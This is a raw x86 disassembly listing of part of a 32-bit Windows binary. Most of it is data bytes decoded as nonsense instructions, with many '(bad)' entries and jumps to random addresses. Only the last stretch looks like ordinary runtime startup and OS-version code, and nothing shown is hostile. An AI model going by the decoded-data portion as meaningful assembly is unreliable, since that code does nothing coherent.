  423c89:	lods   eax,DWORD PTR ds:[esi]
  423c8a:	ins    BYTE PTR es:[edi],dx
  423c8b:	sbb    eax,0xd17d298
  423c90:	xchg   ecx,eax
  423c91:	call   0x636b:0xf916b9db
  423c98:	and    esi,edx
  423c9a:	jno    0x423c9c
  423c9c:	jmp    0x7810:0x5b111b2
  423ca3:	das    
  423ca4:	sbb    eax,0x5865f22
  423ca9:	out    0x9f,eax
  423cab:	fdiv   QWORD PTR [eax+0x4587d88d]
  423cb1:	fstp   DWORD PTR [esi+edx*2]
  423cb4:	push   ds
  423cb5:	and    BYTE PTR ds:0xe8d68681,dl
  423cbb:	xor    BYTE PTR [esi-0x1f759fa8],ch
  423cc1:	sub    DWORD PTR [ebx],ebx
  423cc3:	inc    eax
  423cc4:	inc    esi
  423cc5:	les    esp,FWORD PTR [ebp+0x1c]
  423cc8:	lods   eax,DWORD PTR ds:[esi]
  423cc9:	mov    al,0xf3
  423ccb:	js     0x423d2e
  423ccd:	inc    esp
  423cce:	jecxz  0x423c95
  423cd0:	pop    ebp
  423cd1:	dec    esi
  423cd2:	out    dx,eax
  423cd3:	fidivr WORD PTR [esi-0x3f710493]
  423cd9:	out    0x9c,eax
  423cdb:	out    dx,eax
  423cdc:	das    
  423cdd:	ret    
  423cde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423cdf:	lock sbb eax,0xca2df407
  423ce5:	adc    eax,ebp
  423ce7:	sub    BYTE PTR es:[esi-0x5f],dh
  423ceb:	aas    
  423cec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ced:	adc    ecx,DWORD PTR [ebp-0x54b6f48f]
  423cf3:	inc    ebx
  423cf4:	add    edi,esp
  423cf6:	push   esp
  423cf7:	pop    edi
  423cf8:	adc    ecx,ebx
  423cfa:	int3   
  423cfb:	test   al,0xfd
  423cfd:	test   eax,0xc079dd48
  423d02:	add    BYTE PTR [ebp+0x1],cl
  423d05:	sti    
  423d06:	or     BYTE PTR [ebx+0x54],al
  423d09:	pop    edx
  423d0a:	push   edx
  423d0b:	lahf   
  423d0c:	int3   
  423d0d:	lods   eax,DWORD PTR ds:[esi]
  423d0e:	inc    esi
  423d0f:	xlat   BYTE PTR ds:[ebx]
  423d10:	retf   0x4948
  423d13:	or     eax,0x2241097c
  423d18:	adc    DWORD PTR [ecx+0x65c14b8d],esp
  423d1e:	xor    dh,al
  423d20:	or     ch,dl
  423d22:	je     0x423cd7
  423d24:	mov    al,ds:0x3f21634b
  423d29:	lahf   
  423d2a:	push   edi
  423d2b:	push   eax
  423d2c:	pop    eax
  423d2d:	or     eax,0x535c0a28
  423d32:	(bad)  
  423d33:	out    dx,al
  423d34:	push   ds
  423d35:	iret   
  423d36:	pusha  
  423d37:	daa    
  423d38:	pop    edi
  423d39:	sbb    DWORD PTR [esi+0x5b4d3de6],esi
  423d3f:	xor    DWORD PTR [ebx-0x38],esi
  423d42:	xor    al,0x74
  423d44:	mov    dh,0xb9
  423d46:	mov    ch,0x73
  423d48:	fwait
  423d49:	mov    cs,WORD PTR [ecx]
  423d4b:	jmp    DWORD PTR [eax+0x66ed4624]
  423d51:	fdivr  DWORD PTR [esi-0x10]
  423d54:	gs dec ecx
  423d56:	(bad)  
  423d57:	mov    esp,0x44fa7d63
  423d5c:	inc    edi
  423d5d:	(bad)  
  423d5e:	mov    ecx,0xf99083b3
  423d63:	ret    0x18e9
  423d66:	pop    ebp
  423d67:	sub    al,0xbd
  423d69:	jl     0x423d7b
  423d6b:	sbb    ch,BYTE PTR [eax+0xd]
  423d6e:	and    ch,0x10
  423d71:	in     al,0xb2
  423d73:	fbstp  TBYTE PTR [eax+0x19]
  423d76:	(bad)  
  423d77:	int3   
  423d78:	jp     0x423d5a
  423d7a:	lods   eax,DWORD PTR ds:[esi]
  423d7b:	xchg   ebp,eax
  423d7c:	xor    DWORD PTR [ecx+eax*1+0x99d7d9a],esp
  423d83:	sbb    DWORD PTR [ebp-0x1d],ebx
  423d86:	call   0x780b:0x649d5d2b
  423d8d:	out    0x2f,al
  423d8f:	inc    ebp
  423d90:	and    eax,0x3c42a167
  423d95:	pop    esp
  423d96:	xchg   ebx,eax
  423d97:	dec    edi
  423d98:	dec    esp
  423d99:	adc    al,0x5c
  423d9b:	ss sbb eax,0x2d39fb26
  423da1:	add    al,0xfc
  423da3:	and    eax,0x8f5629f7
  423da8:	mov    esp,0xecdfdad6
  423dad:	pop    eax
  423dae:	xor    BYTE PTR [ecx+0x55d354ef],dl
  423db4:	rcr    DWORD PTR [eax],0x4e
  423db7:	lds    esi,FWORD PTR ds:0x42d11d75
  423dbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423dbe:	test   dl,bh
  423dc0:	mov    ah,0x2e
  423dc2:	mov    al,0x52
  423dc4:	bound  eax,QWORD PTR [edx-0x5b]
  423dc7:	or     ecx,DWORD PTR [ebp+esi*4-0x2f56f9b4]
  423dce:	jmp    0x423d57
  423dd0:	enter  0x55c4,0x2c
  423dd4:	call   0xd701:0x237b3619
  423ddb:	jle    0x423e38
  423ddd:	add    eax,0x4be236ab
  423de2:	add    BYTE PTR [edx],0xf8
  423de5:	or     al,0x7c
  423de7:	mov    al,0xcc
  423de9:	enter  0x83c8,0x66
  423ded:	fcmovbe st,st(5)
  423def:	sub    DWORD PTR [ebp+0x28],0xed8738e0
  423df6:	push   eax
  423df7:	cmp    BYTE PTR [esi-0x2a],dh
  423dfa:	sub    eax,0x419211e8
  423dff:	popf   
  423e00:	push   ss
  423e01:	jmp    0x713310b1
  423e06:	pop    ebx
  423e07:	mov    cl,0x9e
  423e09:	mov    DWORD PTR [edi-0x6d],edx
  423e0c:	pop    edx
  423e0d:	and    DWORD PTR [eax+0x7565316f],edx
  423e13:	jg     0x423e37
  423e15:	shr    BYTE PTR [edx],0x3
  423e18:	push   esp
  423e19:	fldenv [ebp+0x77b1c99e]
  423e1f:	xchg   edx,eax
  423e20:	mov    eax,0xada12aac
  423e25:	mov    edx,0x3599e5f6
  423e2a:	and    bl,cl
  423e2c:	xchg   edi,eax
  423e2d:	std    
  423e2e:	hlt    
  423e2f:	out    0xd9,al
  423e31:	sbb    bl,cl
  423e33:	add    eax,0x33126ac1
  423e38:	outs   dx,BYTE PTR fs:[esi]
  423e3a:	cmc    
  423e3b:	jle    0x423ea3
  423e3d:	into   
  423e3e:	jg     0x423eb7
  423e40:	xor    al,0xb7
  423e42:	test   eax,0xa0da8a48
  423e47:	xchg   ebx,eax
  423e48:	cld    
  423e49:	rcr    DWORD PTR [edx],cl
  423e4b:	jbe    0x423ec2
  423e4d:	stc    
  423e4e:	fistp  WORD PTR fs:[edi+0x35]
  423e52:	pop    esp
  423e53:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  423e55:	push   edx
  423e56:	push   ss
  423e57:	xor    BYTE PTR [esi+ebx*2],cl
  423e5a:	(bad)  
  423e5b:	fsubp  st(0),st
  423e5d:	mov    al,0x7c
  423e5f:	xor    edi,esp
  423e61:	push   edi
  423e62:	repnz imul ebx,eax,0x39
  423e66:	fcmovne st,st(0)
  423e68:	bnd jge 0x423e1e
  423e6b:	loopne 0x423ea2
  423e6d:	test   BYTE PTR [edi+0x727eb3f0],ah
  423e73:	add    al,0x22
  423e75:	out    dx,al
  423e76:	fcmovbe st,st(5)
  423e78:	stos   DWORD PTR es:[edi],eax
  423e79:	sbb    DWORD PTR [esi],0x7d0a01de
  423e7f:	xchg   DWORD PTR [eax+0xb],eax
  423e82:	xchg   DWORD PTR [ebx+0x3f65d016],edi
  423e88:	loop   0x423e46
  423e8a:	ss xchg ecx,eax
  423e8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e8d:	test   eax,0xb8d4a3d4
  423e92:	sub    eax,0x919e3fee
  423e97:	cld    
  423e98:	test   al,0x43
  423e9a:	mov    esp,0xb8b6e99f
  423e9f:	(bad)  
  423ea0:	hlt    
  423ea1:	ds pop es
  423ea3:	out    dx,al
  423ea4:	leave  
  423ea5:	fwait
  423ea6:	outs   dx,BYTE PTR ds:[esi]
  423ea7:	test   eax,0x7581441f
  423eac:	nop
  423ead:	pop    esi
  423eae:	adc    DWORD PTR ds:0x8ee4422,esp
  423eb4:	ret    0x241b
  423eb7:	aam    0x75
  423eb9:	out    dx,eax
  423eba:	retf   0x57b3
  423ebd:	push   ds
  423ebe:	sub    bh,BYTE PTR [ecx+0x1a10c7a5]
  423ec4:	nop
  423ec5:	mov    ecx,0xc3d22738
  423eca:	jge    0x423f4a
  423ecc:	in     eax,0xac
  423ece:	pop    edx
  423ecf:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  423ed1:	jae    0x423f18
  423ed3:	mov    edx,0x7bc154b5
  423ed8:	push   ecx
  423ed9:	icebp  
  423eda:	xor    edi,DWORD PTR [ecx-0x4f]
  423edd:	push   ebp
  423ede:	ins    DWORD PTR es:[edi],dx
  423edf:	not    ah
  423ee1:	je     0x423f26
  423ee3:	adc    al,0xed
  423ee5:	push   0xffffffa3
  423ee7:	iret   
  423ee8:	or     edx,edi
  423eea:	push   ss
  423eeb:	dec    esp
  423eec:	jbe    0x423eb5
  423eee:	xlat   BYTE PTR ds:[ebx]
  423eef:	adc    eax,DWORD PTR [ebp-0x51]
  423ef2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ef3:	aaa    
  423ef4:	addr16 leave 
  423ef6:	add    eax,0x91875f1c
  423efb:	hlt    
  423efc:	(bad)  
  423efd:	ss xchg esi,eax
  423eff:	int    0x2c
  423f01:	fidiv  DWORD PTR [edi]
  423f03:	imul   esi,DWORD PTR [edx],0x52d3cb5b
  423f09:	dec    edi
  423f0a:	cmp    ebx,DWORD PTR [ebx-0x26]
  423f0d:	ins    BYTE PTR es:[edi],dx
  423f0e:	outs   dx,DWORD PTR ds:[esi]
  423f0f:	out    dx,eax
  423f10:	ret    0xc616
  423f13:	pop    ebx
  423f14:	push   0x4addf3b5
  423f19:	bound  ecx,QWORD PTR [eax+0x5c]
  423f1c:	add    BYTE PTR [edi],dh
  423f1e:	mov    eax,ds:0x27304032
  423f23:	(bad)  
  423f24:	call   0x1996:0x9ad5d217
  423f2b:	pop    ecx
  423f2c:	fidiv  DWORD PTR [ebp+0x51]
  423f2f:	imul   edx,ecx,0xffffffd5
  423f32:	mov    al,0x3f
  423f34:	adc    ah,BYTE PTR fs:[ebx-0xd]
  423f38:	stos   DWORD PTR es:[edi],eax
  423f39:	(bad)  
  423f3a:	cmp    DWORD PTR [edi],edx
  423f3c:	repnz push edi
  423f3e:	xor    BYTE PTR [ebx-0x7f],0x49
  423f42:	lock jno 0x423f1e
  423f45:	mov    WORD PTR [ecx+ebp*8-0x2],?
  423f49:	and    ch,BYTE PTR [ebx]
  423f4b:	push   esp
  423f4c:	jle    0x423f63
  423f4e:	push   ecx
  423f4f:	mov    bl,0xd0
  423f51:	iret   
  423f52:	dec    ebx
  423f53:	int    0x62
  423f55:	in     al,dx
  423f56:	(bad)  
  423f57:	jl     0x423f5b
  423f59:	xor    BYTE PTR [ecx],dh
  423f5b:	bound  si,DWORD PTR [ecx+0x700fb01a]
  423f62:	push   esi
  423f63:	or     BYTE PTR [ebp+0x1c80d531],ch
  423f69:	outs   dx,BYTE PTR ds:[esi]
  423f6a:	(bad)  
  423f6b:	pop    esi
  423f6c:	jge    0x423f57
  423f6e:	pop    edx
  423f6f:	mov    esp,0x8f6a2af7
  423f74:	push   esi
  423f75:	push   0x9322923e
  423f7a:	push   esi
  423f7b:	into   
  423f7c:	js     0x423f59
  423f7e:	pop    edx
  423f7f:	lahf   
  423f80:	fistp  WORD PTR [ebx]
  423f82:	pop    ecx
  423f83:	push   cs
  423f84:	mov    edi,0x1b6099cc
  423f89:	add    edi,DWORD PTR [edx+0x3de73e4f]
  423f8f:	or     eax,0x95ffbf7e
  423f94:	sbb    DWORD PTR [edx-0x14],0xffffffcd
  423f98:	jmp    0x423f66
  423f9a:	jmp    0x423fdb
  423f9c:	(bad)  
  423f9d:	dec    esp
  423f9e:	imul   eax,DWORD PTR [ecx+0x5efea3a0],0xffffffca
  423fa5:	test   ecx,ecx
  423fa7:	dec    edi
  423fa8:	push   0x12
  423faa:	int3   
  423fab:	push   cs
  423fac:	pop    ebx
  423fad:	rol    BYTE PTR [ecx],1
  423faf:	inc    ebx
  423fb0:	jbe    0x423f51
  423fb2:	outs   dx,BYTE PTR ds:[esi]
  423fb3:	jbe    0x423f7d
  423fb5:	mov    edx,0x8edf52a1
  423fba:	jp     0x423f98
  423fbc:	lds    esp,FWORD PTR [ecx-0x53]
  423fbf:	enter  0x72cd,0x7c
  423fc3:	shl    BYTE PTR [esi-0x73a4abaf],1
  423fc9:	repz xor dh,BYTE PTR [ebp-0x4e763a69]
  423fd0:	imul   esi,DWORD PTR [ebp+0x799b513b],0xffffff86
  423fd7:	out    0xa,eax
  423fd9:	leave  
  423fda:	(bad)  
  423fdb:	call   0x4eea:0xacaa893c
  423fe2:	xor    BYTE PTR [edi+ebx*2],ch
  423fe5:	jno    0x424029
  423fe7:	push   0xfc157978
  423fec:	add    eax,0xf7974e1f
  423ff1:	xchg   edi,eax
  423ff2:	popf   
  423ff3:	mov    bl,0x72
  423ff5:	cwde   
  423ff6:	push   ebp
  423ff7:	pusha  
  423ff8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423ff9:	les    esp,FWORD PTR [eax+0x36af3b8c]
  423fff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424000:	nop
  424001:	mov    cl,0x26
  424003:	ds add eax,0x6bcbbe5
  424009:	dec    esi
  42400a:	dec    ecx
  42400b:	xchg   ecx,eax
  42400c:	bound  edx,QWORD PTR [ebx]
  42400e:	xor    dl,BYTE PTR [eax+0x4731ed07]
  424014:	jnp    0x423fef
  424016:	mov    al,0xc4
  424018:	mov    eax,0x35a0d99d
  42401d:	sar    DWORD PTR [edi+0x3db53537],1
  424023:	mov    bl,0xc5
  424025:	fimul  WORD PTR [ecx+ecx*8]
  424028:	or     esi,DWORD PTR [edi-0x2309a62c]
  42402e:	rcl    DWORD PTR [esi+0x31],1
  424031:	xchg   edx,eax
  424032:	lahf   
  424033:	pop    esp
  424034:	xchg   BYTE PTR [ebp-0x48],dl
  424037:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424038:	loope  0x424092
  42403a:	popf   
  42403b:	or     edi,DWORD PTR [ecx-0x10]
  42403e:	jmp    0x423fd5
  424040:	in     eax,0x2
  424042:	(bad)  
  424043:	cmp    eax,0x9181914a
  424048:	add    bh,0xc8
  42404b:	mov    esi,0xcd43f738
  424050:	or     DWORD PTR [edx-0x5dd5f7bb],edx
  424056:	xor    BYTE PTR ds:0xf87f3354,bl
  42405c:	sbb    BYTE PTR [esi-0x73],ah
  42405f:	sub    BYTE PTR [ebx],bl
  424061:	and    BYTE PTR [ebx],dh
  424063:	mov    ss,WORD PTR [edi+edi*4-0x2a939710]
  42406a:	jo     0x42408b
  42406c:	mov    bl,BYTE PTR [eax-0x4c]
  42406f:	cmp    edi,ebx
  424071:	imul   edi,DWORD PTR [edx],0xffffff90
  424074:	sti    
  424075:	addr16 xchg ebp,eax
  424077:	pop    ss
  424078:	fld    TBYTE PTR [edi+0x21]
  42407b:	sub    al,0x92
  42407d:	aad    0x47
  42407f:	cmp    BYTE PTR [edx],0x78
  424082:	cmc    
  424083:	inc    eax
  424084:	dec    ecx
  424085:	test   DWORD PTR [edx],eax
  424087:	xor    al,0x70
  424089:	aas    
  42408a:	jmp    0x95d5:0x18676a2c
  424091:	fs clc 
  424093:	sub    BYTE PTR [ecx-0x7a],0xd3
  424097:	test   DWORD PTR [edx*8+0x54ae036c],esi
  42409e:	in     eax,dx
  42409f:	push   eax
  4240a0:	retf   
  4240a1:	(bad)  
  4240a2:	xchg   esp,eax
  4240a3:	mov    ah,BYTE PTR [edx]
  4240a5:	or     al,0x85
  4240a7:	dec    edx
  4240a8:	jns    0x4240bc
  4240aa:	xor    dh,BYTE PTR [eax-0x622faf81]
  4240b0:	jg     0x4240e6
  4240b2:	jg     0x42403a
  4240b4:	cmp    BYTE PTR [ebx-0x7b2eb015],0xe
  4240bb:	add    al,0x71
  4240bd:	test   al,0xc1
  4240bf:	in     eax,0x7d
  4240c1:	and    esp,DWORD PTR ds:0xa061a0e0
  4240c7:	pusha  
  4240c8:	fistp  DWORD PTR [esi+0x49]
  4240cb:	sbb    dl,bl
  4240cd:	mov    esi,DWORD PTR [edi+0x26]
  4240d0:	jmp    0x83bf3153
  4240d5:	and    eax,0x8cb04243
  4240da:	into   
  4240db:	pop    edx
  4240dc:	cli    
  4240dd:	and    al,0x2d
  4240df:	mov    dh,0x33
  4240e1:	fwait
  4240e2:	test   eax,0x90ffd0bb
  4240e7:	and    eax,0x9032afd8
  4240ed:	sub    DWORD PTR [eax+0x261a9189],0xffffffc0
  4240f4:	imul   esi,eax,0x3c
  4240f7:	imul   ecx,DWORD PTR [ecx+0x1130ed66],0xfffffff3
  4240fe:	icebp  
  4240ff:	mov    dl,0x2f
  424101:	ins    DWORD PTR es:[edi],dx
  424102:	(bad)  
  424103:	push   ds
  424104:	test   al,0x80
  424106:	add    ecx,eax
  424108:	repz and edi,DWORD PTR [ebp+0x3a7eb62b]
  42410f:	ds in  eax,dx
  424111:	cmp    eax,0x25f61504
  424116:	outs   dx,DWORD PTR ds:[esi]
  424117:	cmp    BYTE PTR [edi+0x3c],ah
  42411a:	lods   al,BYTE PTR ds:[esi]
  42411b:	call   0x159b28a8
  424120:	call   0xcb3:0xe2c8373
  424127:	xchg   dh,dl
  424129:	dec    esp
  42412a:	jae    0x424122
  42412c:	sbb    eax,0x20130a70
  424131:	std    
  424132:	or     DWORD PTR [esi],edx
  424134:	cs (bad) 
  424136:	int3   
  424137:	call   0x3bce8309
  42413c:	pop    es
  42413d:	sbb    eax,0xeebb6683
  424142:	fsubrp st(5),st
  424144:	sti    
  424145:	mov    dl,BYTE PTR [edx]
  424147:	cmp    BYTE PTR [esi],dh
  424149:	push   ecx
  42414a:	scas   al,BYTE PTR es:[edi]
  42414b:	je     0x424198
  42414d:	inc    esi
  42414e:	push   0xffffff8d
  424150:	jg     0x424165
  424152:	jno    0x4240e3
  424154:	(bad)  
  424155:	stc    
  424156:	int3   
  424157:	call   0x9a073fa8
  42415c:	adc    eax,0xeb099d82
  424161:	out    dx,eax
  424162:	cmp    eax,0x49154bd7
  424167:	jg     0x424182
  424169:	dec    ecx
  42416a:	jle    0x4241d3
  42416c:	and    ch,BYTE PTR ds:0x2693301d
  424172:	ins    DWORD PTR es:[edi],dx
  424173:	popf   
  424174:	jae    0x424118
  424176:	xchg   edi,eax
  424177:	push   0x1f
  424179:	mov    ds:0xa802747a,eax
  42417e:	sbb    al,0x9c
  424180:	pop    ecx
  424181:	push   edi
  424182:	pop    esp
  424183:	(bad)  
  424184:	xor    al,0xdb
  424186:	add    edx,DWORD PTR [ebp-0x3d60221e]
  42418c:	fs dec esi
  42418e:	ins    DWORD PTR es:[edi],dx
  42418f:	xchg   ecx,eax
  424190:	je     0x4241eb
  424192:	pop    edx
  424193:	sub    BYTE PTR [ebx],al
  424195:	jno    0x424128
  424197:	loope  0x424154
  424199:	pop    esi
  42419a:	inc    ecx
  42419b:	daa    
  42419c:	push   eax
  42419d:	loop   0x42417f
  42419f:	push   ss
  4241a0:	or     BYTE PTR [esi+eiz*2-0xda23968],ch
  4241a7:	cli    
  4241a8:	addr16 dec esi
  4241aa:	cmp    bh,BYTE PTR [ecx]
  4241ac:	imul   edx,DWORD PTR [ebx+0xb],0xa2c53b44
  4241b3:	add    bh,al
  4241b5:	mov    eax,0x5faefaf0
  4241ba:	dec    ebx
  4241bb:	mov    edx,0x80381192
  4241c0:	sbb    eax,0xb557b5c6
  4241c5:	loope  0x4241e4
  4241c7:	push   ds
  4241c8:	popf   
  4241c9:	push   0x19ed744d
  4241ce:	and    bl,0x61
  4241d1:	pop    es
  4241d2:	stos   DWORD PTR es:[edi],eax
  4241d3:	imul   edx,DWORD PTR [ecx-0xba5630d],0xc72db071
  4241dd:	and    eax,0x217923c0
  4241e2:	mov    al,0x23
  4241e4:	sub    ch,al
  4241e6:	cs or  al,0xac
  4241e9:	push   edx
  4241ea:	mov    cl,0xae
  4241ec:	cld    
  4241ed:	leave  
  4241ee:	add    BYTE PTR [eax-0x56],0xab
  4241f2:	and    esp,DWORD PTR [esi-0x259bd413]
  4241f8:	icebp  
  4241f9:	or     ecx,eax
  4241fb:	addr16 ss in al,dx
  4241fe:	repz neg BYTE PTR [ebx+0x21]
  424202:	sbb    al,0xa4
  424204:	call   0x371f:0x1256d119
  42420b:	clc    
  42420c:	xchg   DWORD PTR [ecx],ebp
  42420e:	test   bh,cl
  424210:	(bad)  
  424212:	shr    ah,cl
  424214:	outs   dx,BYTE PTR ss:[esi]
  424216:	mov    esp,0x159f3afe
  42421b:	imul   ecx,DWORD PTR [edx],0x55
  42421e:	clc    
  42421f:	mov    edx,edi
  424221:	push   ebx
  424222:	(bad)  
  424223:	xor    BYTE PTR [ecx],ch
  424225:	outs   dx,DWORD PTR ds:[esi]
  424226:	mov    bl,0xb6
  424228:	add    al,0x17
  42422a:	cmc    
  42422b:	jmp    0x429f:0x519c8030
  424232:	add    esp,esi
  424234:	lock pop ss
  424236:	or     DWORD PTR [ebp+0x3354fc69],eax
  42423c:	inc    esp
  42423d:	dec    esi
  42423e:	inc    ebx
  42423f:	in     al,0xf8
  424241:	pop    esp
  424242:	or     esi,DWORD PTR [esi]
  424244:	inc    esp
  424245:	fisttp QWORD PTR ds:0xab45d59
  42424b:	int3   
  42424c:	daa    
  42424d:	push   0x2b
  42424f:	fidiv  DWORD PTR [esi+0x6]
  424252:	jnp    0x424272
  424254:	cmc    
  424255:	mov    ebp,0xf597788b
  42425a:	xchg   ebx,eax
  42425b:	clc    
  42425c:	sbb    eax,0x7213763f
  424261:	xchg   edi,eax
  424262:	jge    0x4242d2
  424264:	xor    al,0xe9
  424266:	(bad)  
  424267:	enter  0x8745,0xa6
  42426b:	and    al,0x63
  42426d:	add    eax,0x9928939f
  424272:	rcr    DWORD PTR [edx-0x62],0x7e
  424276:	add    DWORD PTR [edx+0x1f],esp
  424279:	in     al,dx
  42427a:	push   esi
  42427b:	sbb    ebp,0xb2014f47
  424281:	out    0xa6,eax
  424283:	xor    al,BYTE PTR [ebx+ebp*8-0x35]
  424287:	cdq    
  424288:	aad    0x7a
  42428a:	cs mov cl,dl
  42428d:	pusha  
  42428e:	mov    dl,0x0
  424290:	and    cl,BYTE PTR [esi+edi*1]
  424293:	mov    DWORD PTR [eax],ebp
  424295:	fsubr  QWORD PTR [ebp+0xca3e7ba]
  42429b:	int    0xc7
  42429d:	and    eax,0x2d2d966b
  4242a2:	or     ebx,DWORD PTR [eax+0x52a76e67]
  4242a8:	jmp    0x15f8b140
  4242ad:	push   es
  4242ae:	jg     0x4242be
  4242b0:	pop    ebx
  4242b1:	(bad)  
  4242b2:	push   edx
  4242b3:	or     bh,0x3d
  4242b6:	jle    0x424255
  4242b8:	rcl    BYTE PTR ss:[esi+0x3],0xde
  4242bd:	mov    bl,0xab
  4242bf:	mov    ebx,DWORD PTR [ecx-0x3225e699]
  4242c5:	mov    WORD PTR [ebp-0x5a53543e],fs
  4242cb:	cld    
  4242cc:	xchg   edx,eax
  4242cd:	push   0x3b
  4242cf:	mov    ah,0xe9
  4242d1:	das    
  4242d2:	mov    bh,0xd1
  4242d4:	push   ss
  4242d5:	cli    
  4242d6:	dec    eax
  4242d7:	dec    ecx
  4242d8:	(bad)  
  4242d9:	sbb    al,0x81
  4242db:	xchg   esi,eax
  4242dc:	push   edi
  4242dd:	(bad)  
  4242de:	jg     0x424287
  4242e0:	or     BYTE PTR [ebp-0x3d],bl
  4242e3:	mov    BYTE PTR [ecx-0x1b1a7173],dh
  4242e9:	sbb    eax,0xbaf4801b
  4242ee:	cli    
  4242ef:	add    al,BYTE PTR [esi+0x13b6dac4]
  4242f5:	in     eax,dx
  4242f6:	push   esi
  4242f7:	push   esi
  4242f8:	mov    ebp,0x6a1823e
  4242fd:	leave  
  4242fe:	xor    al,0xc7
  424300:	xlat   BYTE PTR ds:[ebx]
  424301:	and    dh,ah
  424303:	rcr    DWORD PTR [ebx-0x746ef2ad],0x57
  42430a:	jg     0x4242e5
  42430c:	inc    ebx
  42430d:	arpl   WORD PTR [edx+ebp*4],bp
  424310:	ja     0x42434b
  424312:	jb     0x424322
  424314:	imul   esp,esi,0xfb92c1a8
  42431a:	or     ecx,DWORD PTR [ebp+0x3b37dccd]
  424320:	jns    0x42432a
  424322:	outs   dx,DWORD PTR ds:[esi]
  424323:	(bad)  
  424324:	adc    DWORD PTR [edx],ecx
  424326:	arpl   WORD PTR [ebp-0x32],ax
  424329:	loop   0x424335
  42432b:	sbb    dl,ch
  42432d:	lea    eax,[edx+0x4971354c]
  424333:	xchg   ch,bl
  424335:	ret    0xd0d
  424338:	push   eax
  424339:	ret    
  42433a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42433b:	jbe    0x424389
  42433d:	adc    ch,dh
  42433f:	out    0x6,al
  424341:	mov    ch,0x32
  424343:	push   ss
  424344:	and    al,0xe2
  424347:	adc    al,0x23
  424349:	or     eax,0xdcca133d
  42434e:	xor    BYTE PTR [edi-0x69],dl
  424351:	rcr    DWORD PTR [edx-0x7b7f95e2],0x48
  424358:	push   ecx
  424359:	or     al,0x97
  42435b:	sub    DWORD PTR [edx-0x79bdd0a1],ecx
  424361:	mov    eax,0xd57f483f
  424366:	mov    dh,0xdc
  424368:	jecxz  0x424311
  42436a:	mov    ah,0x8f
  42436c:	cwde   
  42436d:	fs add al,0x18
  424370:	popa   
  424371:	in     eax,0xed
  424373:	cli    
  424374:	push   esp
  424375:	or     WORD PTR gs:[ebp-0xc],bp
  42437a:	or     eax,0x85e36251
  42437f:	popa   
  424380:	cli    
  424381:	dec    ecx
  424382:	mov    esi,0x409769d1
  424387:	ror    DWORD PTR [edi+0x74171a4f],1
  42438d:	pusha  
  42438e:	and    al,0x11
  424390:	sub    DWORD PTR [ecx-0x71485898],ebx
  424396:	and    BYTE PTR [esi+0x6d],dl
  424399:	xor    ebx,esi
  42439b:	data16 adc cl,ch
  42439e:	mov    ds:0x1e08c01d,eax
  4243a3:	enter  0x30a4,0x46
  4243a7:	sub    BYTE PTR [ecx+0x15],dl
  4243aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4243ab:	cdq    
  4243ac:	inc    edi
  4243ad:	lods   al,BYTE PTR ds:[esi]
  4243ae:	adc    al,0x64
  4243b0:	mov    cl,0x8e
  4243b2:	adc    al,0x88
  4243b4:	stc    
  4243b5:	jp     0x4243d0
  4243b7:	xchg   BYTE PTR [esi],bh
  4243b9:	jmp    0x4243ee
  4243bb:	mov    ebx,0xc7dc2801
  4243c0:	dec    edx
  4243c1:	mov    ds:0x826dcda5,al
  4243c6:	outs   dx,DWORD PTR ds:[esi]
  4243c7:	dec    edi
  4243c8:	stos   DWORD PTR es:[edi],eax
  4243c9:	push   0xffffffa0
  4243cb:	pop    ss
  4243cc:	shl    BYTE PTR ds:0x4fd55176,1
  4243d2:	mov    eax,0x10749621
  4243d7:	int3   
  4243d8:	repnz (bad) 
  4243da:	xchg   esp,eax
  4243db:	sub    eax,DWORD PTR [edi+0x50]
  4243de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4243df:	or     BYTE PTR [edi+0x4d],bl
  4243e2:	fnstenv [ecx-0x71]
  4243e5:	cmp    esp,DWORD PTR [esi+edi*2+0x35]
  4243e9:	xor    BYTE PTR [ebx+0x6aaad3f7],ch
  4243ef:	add    BYTE PTR [edx+0x0],ch
  4243f2:	call   0x424400
  4243f7:	xor    eax,eax
  4243f9:	add    esp,0x10
  4243fc:	ret    0x10
  4243ff:	nop
  424400:	jmp    DWORD PTR ds:0x429110
  424406:	cmp    DWORD PTR ds:0x45dabc,0x1
  42440d:	jne    0x424414
  42440f:	call   0x424952
  424414:	push   DWORD PTR [esp+0x4]
  424418:	call   0x4247db
  42441d:	push   0xff
  424422:	call   DWORD PTR ds:0x45d1c0
  424428:	pop    ecx
  424429:	pop    ecx
  42442a:	ret    
  42442b:	cmp    DWORD PTR ds:0x45dabc,0x1
  424432:	jne    0x424439
  424434:	call   0x424952
  424439:	push   DWORD PTR [esp+0x4]
  42443d:	call   0x4247db
  424442:	push   0xff
  424447:	call   0x424621
  42444c:	pop    ecx
  42444d:	pop    ecx
  42444e:	ret    
  42444f:	push   0x60
  424451:	push   0x429220
  424456:	call   0x425340
  42445b:	mov    edi,0x94
  424460:	mov    eax,edi
  424462:	call   0x425390
  424467:	mov    DWORD PTR [ebp-0x18],esp
  42446a:	mov    esi,esp
  42446c:	mov    DWORD PTR [esi],edi
  42446e:	push   esi
  42446f:	call   DWORD PTR ds:0x429054
  424475:	mov    ecx,DWORD PTR [esi+0x10]
  424478:	mov    DWORD PTR ds:0x45dac4,ecx
  42447e:	mov    eax,DWORD PTR [esi+0x4]
  424481:	mov    ds:0x45dad0,eax
  424486:	mov    edx,DWORD PTR [esi+0x8]
  424489:	mov    DWORD PTR ds:0x45dad4,edx
  42448f:	mov    esi,DWORD PTR [esi+0xc]
  424492:	and    esi,0x7fff
  424498:	mov    DWORD PTR ds:0x45dac8,esi
  42449e:	cmp    ecx,0x2
  4244a1:	je     0x4244af
  4244a3:	or     esi,0x8000
  4244a9:	mov    DWORD PTR ds:0x45dac8,esi
  4244af:	shl    eax,0x8
  4244b2:	add    eax,edx
  4244b4:	mov    ds:0x45dacc,eax
  4244b9:	xor    esi,esi
